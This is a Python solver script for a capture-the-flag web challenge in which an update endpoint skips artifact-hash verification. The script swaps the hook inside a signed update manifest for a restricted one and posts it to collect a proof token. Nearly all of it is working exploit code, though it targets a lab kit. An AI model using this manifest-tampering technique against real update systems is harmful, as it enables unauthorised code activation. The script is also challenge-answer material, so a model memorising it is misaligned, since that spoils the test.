"""D29 "Trust the Build" (web-exploitation-day-26-trust-the-build): update activation skips artifact-hash verification.

Kit shape: /api/clues = {framework, feature_route, current_role, update_feed, update_policy}; update_feed lists a
signed manifest {package, version, artifact{build, hook}, artifact_sha256, signature}; update_policy names hooks
(routine vs restricted). POST feature_route with the signed manifest but artifact.hook swapped to the restricted
hook -> {"ok":true,"effect":"unverified_update_activated","evidence":"proof_..."}. Re-runnable on any fresh target.
"""
import json
import urllib.parse
import urllib.request

from lib import websolve


def _get_json(base, path):
    req = urllib.request.Request(urllib.parse.urljoin(base, path), headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read().decode("utf-8", "replace"))
    except Exception:
        return None


def _post(url, body):
    req = urllib.request.Request(url, data=json.dumps(body).encode(), method="POST",
                                 headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")
    except Exception:
        return ""


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    route = cl.get("feature_route")
    if not isinstance(route, str):
        return None
    feed = _get_json(base, cl.get("update_feed") or "/api/updates") or {}
    policy = _get_json(base, cl.get("update_policy") or "/api/update-policy") or {}
    hooks = [h.get("name") for h in policy.get("hooks", []) if isinstance(h, dict) and h.get("access") != "routine"]
    hooks = [h for h in hooks if h] or ["privileged_export"]
    url = urllib.parse.urljoin(base, route)
    for upd in feed.get("updates", []) or []:
        if not isinstance(upd, dict):
            continue
        for hook in hooks:
            body = json.loads(json.dumps(upd))
            art = body.get("artifact") if isinstance(body.get("artifact"), dict) else {}
            art["hook"] = hook
            body["artifact"] = art
            p = websolve.proof(_post(url, body))
            if p:
                return p
    return None


KEY_MAP = [(r"^update_policy$", "day29_web_trust_the_build")]
HANDLERS = {"day29_web_trust_the_build": exploit}
